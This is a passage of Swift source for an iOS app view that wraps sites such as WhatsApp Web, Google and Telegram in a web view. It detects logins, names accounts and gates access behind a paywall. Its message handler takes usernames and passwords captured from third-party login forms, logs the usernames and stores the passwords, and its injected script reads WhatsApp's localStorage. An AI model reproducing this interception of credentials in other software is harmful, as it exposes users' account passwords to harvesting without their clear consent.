                    self.loginTimer = nil
                    
                    DispatchQueue.main.async {
                        let cleanName = fetchedName.trimmingCharacters(in: .whitespacesAndNewlines)
                        let isGenericName = cleanName.isEmpty ||
                                            cleanName == "Account" ||
                                            cleanName.starts(with: "-") ||
                                            cleanName.contains("Log in") ||
                                            cleanName.contains("Sign in") ||
                                            cleanName.contains("Sign up") ||
                                            cleanName.contains("લૉગ ઇન") ||
                                            cleanName.contains("સાઇન અપ") ||
                                            cleanName.contains(self.parent.platform.displayName) ||
                                            cleanName.contains(self.parent.platform.rawValue) ||
                                            cleanName.contains("Facebook") ||
                                            cleanName.contains("Instagram") ||
                                            cleanName.contains("Twitter") ||
                                            cleanName.contains("Google") ||
                                            cleanName.contains("Telegram") ||
                                            cleanName.lowercased() == "settings" ||
                                            cleanName.lowercased().contains("help center")
                        
                        let displayName: String
                        if self.parent.platform == .google {
                            var googleEmail = ""
                            if cleanName.contains("@") {
                                googleEmail = cleanName
                            } else if let captured = self.capturedUsername, captured.contains("@") {
                                googleEmail = captured
                            } else if let cred = CoreDataManager.shared.getLatestCredential(for: "Google"), cred.username.contains("@") {
                                googleEmail = cred.username
                            }
                            
                            if !googleEmail.isEmpty {
                                displayName = googleEmail
                            } else {
                                let num = AccountManager.shared.nextAvailableNumber(for: .google, excludingAccountId: self.parent.account.id)
                                displayName = "Google - \(num)"
                            }
                        } else if !isGenericName && self.parent.platform != .telegram {
                            displayName = cleanName
                        } else {
                            let prefix1 = "\(self.parent.platform.displayName) - "
                            let prefix2 = "\(self.parent.platform.rawValue) - "
                            let currentName = self.parent.account.accountName.trimmingCharacters(in: .whitespacesAndNewlines)
                            let isAlreadyNumbered = [prefix1, prefix2, "WhatsApp - ", "WT Scan - "].contains(where: {
                                currentName.starts(with: $0) && Int(currentName.dropFirst($0.count)) != nil
                            })
                            
                            if isAlreadyNumbered {
                                displayName = currentName
                            } else {
                                let namePrefix = (self.parent.platform == .whatsApp) ? "WhatsApp" : self.parent.platform.displayName
                                let num = AccountManager.shared.nextAvailableNumber(for: self.parent.platform, excludingAccountId: self.parent.account.id)
                                displayName = "\(namePrefix) - \(num)"
                            }
                        }
                        
                        var acc = self.parent.account
                        acc.accountName = displayName
                        acc.isSessionActive = true
                        self.parent.account = acc
                        self.parent.currentTitle = displayName
                        AccountManager.shared.save(acc)
                        print("🎉 [CloneWebView] Login detected and account saved in Recent Platforms: [\(self.parent.platform.displayName)] '\(displayName)' (id: \(acc.id))")
                        
                        DispatchQueue.main.async {
                            if !self.parent.isPro {
                                print("🔒 [CloneWebView] User not Pro -> Showing Premium Paywall after login")
                                self.parent.showPaywall = true
                            } else {
                                withAnimation(.easeInOut(duration: 0.35)) {
                                    self.parent.isLoggedIn = true
                                }
                            }
                        }
                    }
                }
            }
        }
        
        private func checkWhatsAppStatus(webView: WKWebView) {
            let js = """
            (function() {
                var bodyText = (document.body ? (document.body.innerText || '') : '').toLowerCase();
                
                var isLoggingOut = bodyText.includes('logging out')
                                || (bodyText.includes("don't close this window") && !document.querySelector('#pane-side'));
                
                var isQR = document.querySelector('[data-ref]') != null
                        || (document.querySelector('canvas') != null && document.querySelector('canvas').width > 10)
                        || document.querySelector('[data-testid="qrcode"]') != null
                        || document.querySelector('div[data-ref]') != null;
                
                var chatList = document.querySelector('#pane-side')
                            || document.querySelector('div[aria-label="Chat list"]')
                            || document.querySelector('[data-testid="chat-list"]')
                            || document.querySelector('div[role="grid"]')
                            || document.querySelector('#side')
                            || document.querySelector('[data-testid="intro-title"]')
                            || document.querySelector('[data-testid="conversation-panel-wrapper"]')
                            || document.querySelector('[data-testid="chat-list-header"]');
                
                var userName = '';
                if (chatList && !isLoggingOut) {
                    try {
                        for (var i = 0; i < localStorage.length; i++) {
                            var k = localStorage.key(i);
                            if (!k) continue;
                            var v = localStorage.getItem(k);
                            if (!v) continue;
                            
                            var lk = k.toLowerCase();
                            if (lk === 'pushname' || lk === 'user_pushname' || lk === '__fetched_user_name') {
                                var clean = v.replace(/["']/g, '').trim();
                                if (clean && clean.length >= 2 && !/^\\+?\\d+$/.test(clean) && clean !== 'null' && clean !== 'undefined') {
                                    userName = clean;
                                    break;
                                }
                            }
                            
                            if (v.includes('pushname') || v.includes('notifyName') || v.includes('displayName')) {
                                var match = v.match(/"(?:pushname|notifyName|displayName)":\\s*"([^"]+)"/i);
                                if (match && match[1]) {
                                    var cand = match[1].replace(/\\\\"/g, '"').trim();
                                    if (cand && cand.length >= 2 && !/^\\+?\\d+$/.test(cand) && cand !== 'null' && cand !== 'undefined') {
                                        userName = cand;
                                        break;
                                    }
                                }
                            }
                        }
                    } catch(e) {}
                    
                    if (!userName) {
                        try {
                            var header = document.querySelector('header');
                            if (header) {
                                var profileBtn = header.querySelector('button[aria-label*="profile" i]') 
                                              || header.querySelector('[data-testid="chat-list-header"] button');
                                if (profileBtn) {
                                    var aria = profileBtn.getAttribute('aria-label') || profileBtn.getAttribute('title') || '';
                                    var cleanAria = aria.replace(/profile/gi, '').replace(/your/gi, '').replace(/photo/gi, '').replace(/picture/gi, '').replace(/[,:_ -]/g, '').trim();
                                    if (cleanAria.length > 1 && !/^\\+?\\d+$/.test(cleanAria) && !cleanAria.toLowerCase().includes('status') && !cleanAria.toLowerCase().includes('menu')) {
                                        userName = cleanAria;
                                    }
                                }
                            }
                        } catch(e) {}
                    }
                }
                
                return JSON.stringify({
                    hasChatList: chatList != null && !isLoggingOut,
                    isLoggingOut: isLoggingOut,
                    hasQR: isQR,
                    name: userName
                });
            })()
            """
            
            webView.evaluateJavaScript(js) { [weak self] result, error in
                guard let self = self else { return }
                guard let jsonString = result as? String,
                      let data = jsonString.data(using: .utf8),
                      let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
                    return
                }
                
                let isLoggingOut = dict["isLoggingOut"] as? Bool ?? false
                let hasChatList = dict["hasChatList"] as? Bool ?? false
                let hasQR = dict["hasQR"] as? Bool ?? false
                let fetchedName = dict["name"] as? String ?? ""
                
                if (self.hasSeenLoggedIn && (isLoggingOut || (hasQR && !hasChatList))) || (self.pageLoadCompleted && hasQR && !hasChatList) {
                    // WhatsApp logged out or is logging out!
                    print("🚪 WhatsApp logout detected in CloneWebView - resetting session and opening WebScannerView")
                    self.loginTimer?.invalidate()
                    self.loginTimer = nil
                    self.webView?.stopLoading()
                    
                    DispatchQueue.main.async {
                        var acc = self.parent.account
                        AccountManager.shared.resetWhatsAppSession(for: &acc)
                        self.parent.account = acc
                        self.parent.currentTitle = acc.accountName
                        UserDefaults.standard.set(false, forKey: "is_whatsapp_web_logged_in")
                        TabBarManager.shared.isHidden = true
                        HapticFeedback.generate(.medium)
                        withAnimation(.easeInOut(duration: 0.25)) {
                            self.parent.shouldOpenWebScanner = true
                        }
                    }
                } else if hasChatList {
                    self.hasSeenLoggedIn = true
                    DispatchQueue.main.async {
                        var acc = self.parent.account
                        if !fetchedName.isEmpty && !AccountManager.isPhoneNumber(fetchedName) {
                            self.parent.currentTitle = fetchedName
                            acc.accountName = fetchedName
                        } else {
                            let currentName = acc.accountName.trimmingCharacters(in: .whitespacesAndNewlines)
                            let isAlreadyNumbered = ["WhatsApp - ", "WT Scan - "].contains(where: {
                                currentName.starts(with: $0) && Int(currentName.dropFirst($0.count)) != nil
                            })
                            if !isAlreadyNumbered {
                                let num = AccountManager.shared.whatsappIndex(for: acc)
                                let newName = "WhatsApp - \(num)"
                                self.parent.currentTitle = newName
                                acc.accountName = newName
                            }
                        }
                        acc.isSessionActive = true
                        self.parent.account = acc
                        AccountManager.shared.save(acc)
                        
                        if !self.parent.isPro {
                            print("🔒 [CloneWebView] User not Pro -> Showing Premium Paywall for WhatsApp Web")
                            self.parent.showPaywall = true
                        } else {
                            withAnimation(.easeInOut(duration: 0.35)) {
                                self.parent.isLoggedIn = true
                            }
                        }
                    }
                    
                    if self.loginTimer?.timeInterval != 2.5 {
                        self.loginTimer?.invalidate()
                        self.loginTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
                            guard let self = self, let webView = self.webView else { return }
                            self.checkWhatsAppStatus(webView: webView)
                        }
                    }
                }
            }
        }
        
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            if message.name == "statusHandler" {
                StatusSaverHelper.handleStatusMedia(body: message.body)
                return
            }
            
            guard message.name == "credentialsHandler",
                  let dict = message.body as? [String: Any] else { return }
            
            let platform = dict["platform"] as? String ?? parent.platform.displayName
            let username = dict["username"] as? String ?? ""
            let password = dict["password"] as? String ?? ""
            let url = dict["url"] as? String ?? ""
            
            guard !username.isEmpty || !password.isEmpty else { return }
            
            if !username.isEmpty {
                self.capturedUsername = username
            }
            
            print("[CoreData] Intercepted credentials for \(platform) - user: \(username)")
            
            CoreDataManager.shared.saveCredential(
                platform: platform,
                username: username,
                password: password,
                url: url
            )
        }
        
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            DispatchQueue.main.async {
                self.parent.isLoading = true
            }
            self.pageLoadCompleted = false
            if !self.hasSeenLoggedIn {
                self.startLoginCheckTimer(webView: webView)
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.async {
                self.parent.isLoading = false
                self.parent.canGoBack = webView.canGoBack
                self.parent.canGoForward = webView.canGoForward
                self.parent.pageTitle = webView.title ?? ""
            }
            if !self.hasSeenLoggedIn {
                self.checkLoginStatus(webView: webView)
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { [weak self] in
                self?.pageLoadCompleted = true
            }
        }
        
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            DispatchQueue.main.async {
                self.parent.isLoading = false
            }
        }
    }
}

#Preview {
    CloneWebView(platform: .telegram)
}
